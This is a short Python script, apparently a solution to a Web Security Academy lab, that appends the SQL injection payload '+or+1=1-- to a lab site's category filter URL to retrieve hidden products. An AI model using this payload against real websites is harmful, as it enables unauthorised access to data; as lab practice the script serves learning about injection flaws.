"""
SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
"""

def link(choice):
    url = "https://0a0c0025035d7ed180fe21d200fe0084.web-security-academy.net/filter?category="
    exploit = "'+or+1=1--"
    main_url = url + choice + exploit
   
    return main_url

if __name__ == "__main__":
    print(link(choice="Gifts"))
